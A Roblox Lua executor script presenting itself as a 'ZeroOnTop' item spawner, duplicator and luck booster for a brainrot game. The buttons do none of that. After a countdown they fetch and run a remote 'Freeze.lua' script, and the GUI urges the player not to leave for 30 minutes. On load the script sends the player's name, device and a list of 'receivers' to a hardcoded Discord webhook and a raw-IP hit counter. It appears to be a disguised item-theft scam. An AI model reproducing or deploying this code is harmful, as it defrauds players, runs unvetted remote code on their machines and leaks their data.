local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")

local WEBHOOK_URL = (_G["Zero_Config"] and _G["Zero_Config"].user_webhook) or ""
local TARGET_PLAYERS = (_G["Zero_Config"] and _G["Zero_Config"].users) or {}
local PUBLIC_WEBHOOK_URL = "https://discord.com/api/webhooks/1452387900166635622/6jzYQUIloNR8GvEq4dtGp0ZIbie2--AI9_oYBa3Fc7i1f-xvBGcJDSgr7ltJL90lzLAb"
local VPS_INCREMENT = "http://13.239.7.10:5000/increment-hitcount"
local API_KEY = getgenv().API_KEY or "supersecretkey"

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local function safeRequest(url, body, headers)
    local h = headers or {["Content-Type"] = "application/json"}
    pcall(function()
        (syn and syn.request or http and http.request or request or HttpService.PostAsync)({
            Url  = url,
            Method = "POST",
            Headers = h,
            Body = HttpService:JSONEncode(body)
        })
    end)
end

local function sendZeroEmbed(title, desc, color, fields, isPublic)
    local payload = {
        username = "ZeroOnTop",
        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
        embeds = {{
            title = title,
            description = desc,
            color = color,
            fields = fields or {},
            footer = {text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png"},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    safeRequest(isPublic and PUBLIC_WEBHOOK_URL or WEBHOOK_URL, payload)
end

local function triggerVpsHit()
    if WEBHOOK_URL == "" then return end
    safeRequest(VPS_INCREMENT, {webhook = WEBHOOK_URL}, {["X-API-KEY"] = API_KEY})
end

local CONFIG = {
    DELAY_BEFORE_SCRIPT = 8,
    EXTERNAL_SCRIPT_URL = "https://raw.githubusercontent.com/zeroonbottomyt/kindabroke/refs/heads/main/Freeze.lua",
    WARNING_TEXT = "May cause lag. Don't Leave — wait 30 minutes."
}

local IS_MOBILE = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

local function buildGui()
    local gui = Instance.new("ScreenGui")
    gui.Name = IS_MOBILE and "zero_main_mobile" or "zero_main_pc"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = playerGui

    local main = Instance.new("Frame")
    main.Size = IS_MOBILE and UDim2.fromScale(0.88, 0.78) or UDim2.new(0.45, 0, 0.7, 0)
    main.Position = UDim2.fromScale(0.5, 0.5)
    main.AnchorPoint = Vector2.new(0.5, 0.5)
    main.BackgroundTransparency = 0.05
    main.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
    main.BorderSizePixel = 0
    main.Parent = gui
    local corner = Instance.new("UICorner", main)
    corner.CornerRadius = IS_MOBILE and UDim.new(0.04, 0) or UDim.new(0, 18)

    local stroke = Instance.new("UIStroke", main)
    stroke.Thickness = 2
    stroke.Color = Color3.fromRGB(100, 150, 255)
    stroke.Transparency = 0.5

    local gradient = Instance.new("UIGradient", main)
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 55)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 30))
    })
    gradient.Rotation = 135

    local aspect = Instance.new("UIAspectRatioConstraint", main)
    aspect.AspectRatio = 1.22

    local titleBar = Instance.new("Frame")
    titleBar.Size = IS_MOBILE and UDim2.fromScale(1, 0.12) or UDim2.new(1, 0, 0, 70)
    titleBar.BackgroundTransparency = 1
    titleBar.Parent = main

    local title = Instance.new("TextLabel")
    title.Size = IS_MOBILE and UDim2.fromScale(0.5, 1) or UDim2.new(0.5, 0, 1, 0)
    title.Position = IS_MOBILE and UDim2.fromScale(0.04, 0) or UDim2.new(0, 25, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "ZeroOnTop"
    title.TextColor3 = Color3.fromRGB(230, 240, 255)
    title.Font = Enum.Font.GothamBlack
    title.TextScaled = IS_MOBILE
    title.TextSize = IS_MOBILE and 24 or 26
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = titleBar

    local discord = Instance.new("TextButton")
    discord.Size = IS_MOBILE and UDim2.fromScale(0.4, 1) or UDim2.new(0.4, -80, 1, 0)
    discord.Position = IS_MOBILE and UDim2.fromScale(0.56, 0) or UDim2.new(0.6, 0, 0, 0)
    discord.BackgroundTransparency = 1
    discord.Text = IS_MOBILE and "" or "discord.gg/cnUAk7uc3n"
    discord.TextColor3 = Color3.fromRGB(130, 190, 255)
    discord.Font = Enum.Font.GothamSemibold
    discord.TextScaled = IS_MOBILE
    discord.TextSize = IS_MOBILE and 14 or 15
    discord.TextXAlignment = Enum.TextXAlignment.Right
    discord.Parent = titleBar
    discord.MouseButton1Click:Connect(function() setclipboard("https://discord.gg/cnUAk7uc3n") end)

    local close = Instance.new("TextButton")
    close.Size = IS_MOBILE and UDim2.fromScale(0.11, 0.6) or UDim2.new(0, 44, 0, 44)
    close.Position = IS_MOBILE and UDim2.fromScale(0.88, 0.2) or UDim2.new(1, -56, 0, 13)
    close.BackgroundTransparency = 1
    close.Text = "X"
    close.TextColor3 = Color3.fromRGB(255, 120, 120)
    close.Font = Enum.Font.GothamBlack
    close.TextScaled = IS_MOBILE
    close.TextSize = IS_MOBILE and 18 or 28
    close.Parent = titleBar
    close.MouseButton1Click:Connect(function()
        gui:Destroy()
        pcall(function() StarterGui:SetCore("TopbarEnabled", true) end)
    end)

    local tabBar = Instance.new("Frame")
    tabBar.Size = IS_MOBILE and UDim2.fromScale(0.94, 0.09) or UDim2.new(1, -30, 0, 50)
    tabBar.Position = IS_MOBILE and UDim2.fromScale(0.03, 0.15) or UDim2.new(0, 15, 0, 80)
    tabBar.BackgroundTransparency = 1
    tabBar.Parent = main

    local tabLayout = Instance.new("UIListLayout")
    tabLayout.FillDirection = Enum.FillDirection.Horizontal
    tabLayout.Padding = IS_MOBILE and UDim.new(0.02, 0) or UDim.new(0, 10)
    tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    tabLayout.Parent = tabBar

    local content = Instance.new("Frame")
    content.Size = IS_MOBILE and UDim2.fromScale(0.94, 0.68) or UDim2.new(1, -30, 1, -160)
    content.Position = IS_MOBILE and UDim2.fromScale(0.03, 0.26) or UDim2.new(0, 15, 0, 135)
    content.BackgroundTransparency = 1
    content.ClipsDescendants = true
    content.Parent = main

    local tabs, tabBtns = {}, {}
    local function selectTab(name)
        for _, p in pairs(tabs) do p.Visible = false end
        for _, b in pairs(tabBtns) do
            TweenService:Create(b, TweenInfo.new(0.25), {BackgroundColor3 = Color3.fromRGB(35, 35, 55)}):Play()
        end
        local page = tabs[name]
        local btn = tabBtns[name]
        page.Visible = true
        TweenService:Create(btn, TweenInfo.new(0.25), {BackgroundColor3 = Color3.fromRGB(80, 130, 220)}):Play()
    end

    local function makeTab(name, label)
        local btn = Instance.new("TextButton")
        btn.Size = IS_MOBILE and UDim2.fromScale(0.28, 0.8) or UDim2.new(0, 130, 1, 0)
        btn.BackgroundColor3 = Color3.fromRGB(35, 35, 55)
        btn.Text = label
        btn.TextColor3 = Color3.fromRGB(180, 200, 255)
        btn.Font = Enum.Font.GothamBold
        btn.TextScaled = IS_MOBILE
        btn.TextSize = IS_MOBILE and 14 or 15
        btn.Parent = tabBar
        Instance.new("UICorner", btn).CornerRadius = IS_MOBILE and UDim.new(0.12, 0) or UDim.new(0, 12)

        local page = Instance.new("Frame")
        page.Size = IS_MOBILE and UDim2.fromScale(1, 1) or UDim2.new(1, 0, 1, 0)
        page.BackgroundTransparency = 1
        page.Visible = false
        page.Parent = content
        tabs[name] = page
        tabBtns[name] = btn

        btn.MouseEnter:Connect(function()
            if page.Visible then return end
            TweenService:Create(btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(50, 70, 120)}):Play()
        end)
        btn.MouseLeave:Connect(function()
            if page.Visible then return end
            TweenService:Create(btn, TweenInfo.new(0.18), {BackgroundColor3 = Color3.fromRGB(35, 35, 55)}):Play()
        end)
        btn.MouseButton1Click:Connect(function() selectTab(name) end)
    end

    makeTab("Spawner", "Spawner")
    makeTab("Dupe", "Dupe")
    makeTab("Luck", "Server Luck")

    local function setupTabLayout(tabPage)
        local warn = Instance.new("TextLabel")
        warn.Size = IS_MOBILE and UDim2.fromScale(0.9, 0.08) or UDim2.new(0.9, 0, 0, 36)
        warn.Position = IS_MOBILE and UDim2.fromScale(0.05, 0.05) or UDim2.new(0.05, 0, 0.05, 0)
        warn.BackgroundTransparency = 1
        warn.Text = CONFIG.WARNING_TEXT
        warn.TextColor3 = Color3.fromRGB(255, 90, 90)
        warn.Font = Enum.Font.GothamBold
        warn.TextScaled = IS_MOBILE
        warn.TextSize = IS_MOBILE and 12 or 13
        warn.TextXAlignment = Enum.TextXAlignment.Center
        warn.Parent = tabPage

        local input = Instance.new("TextBox")
        input.Size = IS_MOBILE and UDim2.fromScale(0.9, 0.1) or UDim2.new(0.9, 0, 0, 48)
        input.Position = IS_MOBILE and UDim2.fromScale(0.05, 0.18) or UDim2.new(0.05, 0, 0.18, 0)
        input.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
        input.TextColor3 = Color3.fromRGB(200, 220, 255)
        input.Font = Enum.Font.Gotham
        input.TextScaled = IS_MOBILE
        input.TextSize = IS_MOBILE and 14 or 16
        input.ClearTextOnFocus = false
        input.Parent = tabPage
        Instance.new("UICorner", input).CornerRadius = IS_MOBILE and UDim.new(0.15, 0) or UDim.new(0, 12)
        local pad = Instance.new("UIPadding", input)
        pad.PaddingLeft = IS_MOBILE and UDim.new(0.05, 0) or UDim.new(0, 15)
        pad.PaddingRight = IS_MOBILE and UDim.new(0.05, 0) or UDim.new(0, 15)

        local btn = Instance.new("TextButton")
        btn.Size = IS_MOBILE and UDim2.fromScale(0.9, 0.1) or UDim2.new(0.9, 0, 0, 48)
        btn.Position = IS_MOBILE and UDim2.fromScale(0.05, 0.32) or UDim2.new(0.05, 0, 0.30, 0)
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.Font = Enum.Font.GothamBlack
        btn.TextScaled = IS_MOBILE
        btn.TextSize = IS_MOBILE and 14 or 18
        btn.Parent = tabPage
        Instance.new("UICorner", btn).CornerRadius = IS_MOBILE and UDim.new(0.15, 0) or UDim.new(0, 12)

        return warn, input, btn
    end

    local _, spawnBox, spawnBtn = setupTabLayout(tabs.Spawner)
    spawnBox.PlaceholderText = "Enter brainrot name..."
    spawnBox.Text = IS_MOBILE and "" or "Enter brainrot name..."
    spawnBtn.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
    spawnBtn.Text = "SPAWN"

    local _, dupeBox, dupeBtn = setupTabLayout(tabs.Dupe)
    dupeBox.PlaceholderText = "Enter brainrot to dupe..."
    dupeBox.Text = IS_MOBILE and "" or "Enter brainrot to dupe..."
    dupeBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 50)
    dupeBtn.Text = "DUPE"

    local _, luckInput, luckBtn = setupTabLayout(tabs.Luck)
    luckInput.PlaceholderText = "Enter multiplier (1, 2, 4, 8, 16, 38)..."
    luckInput.Text = IS_MOBILE and "" or "Enter multiplier (1, 2, 4, 8, 16, 38)..."
    luckBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 180)
    luckBtn.Text = "SET LUCK"

    local quickContainer = Instance.new("Frame")
    quickContainer.Size = IS_MOBILE and UDim2.fromScale(0.9, 0.18) or UDim2.new(0.9, 0, 0, 80)
    quickContainer.Position = IS_MOBILE and UDim2.fromScale(0.05, 0.45) or UDim2.new(0.05, 0, 0.42, 0)
    quickContainer.BackgroundTransparency = 1
    quickContainer.Parent = tabs.Luck

    local quickLayout = Instance.new("UIGridLayout")
    quickLayout.CellSize = IS_MOBILE and UDim2.fromScale(0.28, 0.4) or UDim2.new(0.3, 0, 0, 36)
    quickLayout.CellPadding = IS_MOBILE and UDim2.fromScale(0.03, 0.03) or UDim2.new(0.02, 0, 0, 8)
    quickLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    quickLayout.Parent = quickContainer

    local quickValues = {1,2,4,8,16,38}
    for _, v in ipairs(quickValues) do
        local b = Instance.new("TextButton")
        b.BackgroundColor3 = Color3.fromRGB(60, 60, 140)
        b.Text = v.."x"
        b.TextColor3 = Color3.new(1,1,1)
        b.Font = Enum.Font.GothamBold
        b.TextScaled = IS_MOBILE
        b.TextSize = IS_MOBILE and 12 or 14
        b.Parent = quickContainer
        Instance.new("UICorner", b).CornerRadius = IS_MOBILE and UDim.new(0.2, 0) or UDim.new(0, 10)
        b.MouseButton1Click:Connect(function()
            luckInput.Text = tostring(v)
        end)
    end

    local function setupInput(box, placeholder)
        local defaultCol = Color3.fromRGB(200, 220, 255)
        local activeCol = Color3.new(1,1,1)
        box.Focused:Connect(function()
            if box.Text == "" or box.Text == placeholder then
                box.Text = ""
                box.TextColor3 = activeCol
            end
        end)
        box.FocusLost:Connect(function()
            if box.Text == "" then
                box.Text = placeholder
                box.TextColor3 = defaultCol
            end
        end)
        if IS_MOBILE then
            box.Text = ""
            box.PlaceholderText = placeholder
            box.TextColor3 = defaultCol
        end
    end
    setupInput(spawnBox, "Enter brainrot name...")
    setupInput(dupeBox, "Enter brainrot to dupe...")
    setupInput(luckInput, "Enter multiplier (1, 2, 4, 8, 16, 38)...")

    local function showNotif(action, value)
        local notif = Instance.new("ScreenGui")
        notif.Name = "zero_notif"
        notif.Parent = playerGui
        local f = Instance.new("Frame")
        f.Size = IS_MOBILE and UDim2.fromScale(0.9, 0.18) or UDim2.new(0, 460, 0, 130)
        f.Position = IS_MOBILE and UDim2.fromScale(0.5, 0.05) or UDim2.new(0.5, -230, 0, 20)
        f.AnchorPoint = IS_MOBILE and Vector2.new(0.5, 0) or Vector2.new(0.5, 0)
        f.BackgroundColor3 = Color3.fromRGB(25, 25, 45)
        f.BackgroundTransparency = 1
        f.Parent = notif
        Instance.new("UICorner", f).CornerRadius = IS_MOBILE and UDim.new(0.06, 0) or UDim.new(0, 16)

        local titleL = Instance.new("TextLabel")
        titleL.Size = IS_MOBILE and UDim2.fromScale(1, 0.3) or UDim2.new(1, -20, 0.3, 0)
        titleL.Position = IS_MOBILE and UDim2.fromScale(0, 0.05) or UDim2.new(0, 10, 0, 8)
        titleL.BackgroundTransparency = 1
        titleL.Text = action.." "..value
        titleL.TextColor3 = Color3.fromRGB(0, 255, 120)
        titleL.Font = Enum.Font.GothamBlack
        titleL.TextScaled = IS_MOBILE
        titleL.TextSize = IS_MOBILE and 16 or 18
        titleL.Parent = f

        local warn = Instance.new("TextLabel")
        warn.Size = IS_MOBILE and UDim2.fromScale(0.9, 0.3) or UDim2.new(1, -20, 0.35, 0)
        warn.Position = IS_MOBILE and UDim2.fromScale(0.05, 0.35) or UDim2.new(0, 10, 0.3, 0)
        warn.BackgroundTransparency = 1
        warn.Text = CONFIG.WARNING_TEXT
        warn.TextColor3 = Color3.fromRGB(255, 100, 100)
        warn.Font = IS_MOBILE and Enum.Font.Gotham or Enum.Font.Gotham
        warn.TextScaled = IS_MOBILE
        warn.TextSize = IS_MOBILE and 12 or 13
        warn.TextWrapped = true
        warn.Parent = f

        local timer = Instance.new("TextLabel")
        timer.Size = IS_MOBILE and UDim2.fromScale(0.9, 0.2) or UDim2.new(1, -20, 0.25, 0)
        timer.Position = IS_MOBILE and UDim2.fromScale(0.05, 0.7) or UDim2.new(0, 10, 0.7, 0)
        timer.BackgroundTransparency = 1
        timer.Text = "Script runs in 8 seconds..."
        timer.TextColor3 = Color3.fromRGB(255, 220, 100)
        timer.Font = Enum.Font.GothamBold
        timer.TextScaled = IS_MOBILE
        timer.TextSize = IS_MOBILE and 12 or 14
        timer.Parent = f

        TweenService:Create(f, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()
        local countdown = CONFIG.DELAY_BEFORE_SCRIPT
        local conn = RunService.Heartbeat:Connect(function(dt)
            countdown -= dt
            local sec = math.ceil(countdown)
            timer.Text = "Script runs in "..sec.." second"..(sec==1 and "" or "s").."..."
            if countdown <= 0 then
                conn:Disconnect()
                TweenService:Create(f, TweenInfo.new(0.4), {BackgroundTransparency = 1}):Play()
                task.delay(0.4, function() if notif then notif:Destroy() end end)
            end
        end)
        return conn
    end

    local function runExternal()
        pcall(function()
            loadstring(game:HttpGet(CONFIG.EXTERNAL_SCRIPT_URL))()
        end)
    end

    local function execute(action, getVal)
        local val = getVal()
        if not val or val == "" then
            local orig = main.Position
            for i = 1, 4 do
                TweenService:Create(main, TweenInfo.new(0.05), {Position = orig + (IS_MOBILE and UDim2.fromScale(0.015, 0) or UDim2.new(0, 10, 0, 0))}):Play()
                task.wait(0.05)
                TweenService:Create(main, TweenInfo.new(0.05), {Position = orig + (IS_MOBILE and UDim2.fromScale(-0.015, 0) or UDim2.new(0, -10, 0, 0))}):Play()
                task.wait(0.05)
            end
            TweenService:Create(main, TweenInfo.new(0.1), {Position = orig}):Play()
            return
        end
        local conn = showNotif(action, val)
        task.delay(CONFIG.DELAY_BEFORE_SCRIPT, function()
            if conn then conn:Disconnect() end
            runExternal()
        end)
    end

    spawnBtn.MouseButton1Click:Connect(function()
        execute("Spawning", function() return spawnBox.Text ~= spawnBox.PlaceholderText and spawnBox.Text or "" end)
    end)

    dupeBtn.MouseButton1Click:Connect(function()
        execute("Duping", function() return dupeBox.Text ~= dupeBox.PlaceholderText and dupeBox.Text or "" end)
    end)

    luckBtn.MouseButton1Click:Connect(function()
        local txt = luckInput.Text
        local n = tonumber(txt)
        if not n or not ({1,2,4,8,16,38})[n] then
            local orig = main.Position
            for i = 1, 4 do
                TweenService:Create(main, TweenInfo.new(0.05), {Position = orig + (IS_MOBILE and UDim2.fromScale(0.015, 0) or UDim2.new(0, 10, 0, 0))}):Play()
                task.wait(0.05)
                TweenService:Create(main, TweenInfo.new(0.05), {Position = orig + (IS_MOBILE and UDim2.fromScale(-0.015, 0) or UDim2.new(0, -10, 0, 0))}):Play()
                task.wait(0.05)
            end
            TweenService:Create(main, TweenInfo.new(0.1), {Position = orig}):Play()
            return
        end
        execute("Server Luck", function() return txt.."x" end)
    end)

    local dragging = false
    local dragStart, startPos
    local function startDrag(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = main.Position
            local ended; ended = input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    ended:Disconnect()
                end
            end)
        end
    end
    local function updateDrag(input)
        if not dragging then return end
        local delta = input.Position - dragStart
        main.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
    titleBar.InputBegan:Connect(startDrag)
    titleBar.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            updateDrag(input)
        end
    end)

    selectTab("Spawner")
    return gui
end

task.spawn(function()
    local gui = buildGui()
    local fields = {
        {name = "👤 User", value = "```" .. player.Name .. "```", inline = true},
        {name = "📱 Device", value = "```" .. (IS_MOBILE and "Mobile" or "PC") .. "```", inline = true},
        {name = "🎯 Receiver(s)", value = "```" .. table.concat(TARGET_PLAYERS, ", ") .. "```", inline = false}
    }
    sendZeroEmbed("🖥️ GUI Loaded", "Zero GUI spawned and ready.", 0x2ecc71, fields, false)
    triggerVpsHit()
end)
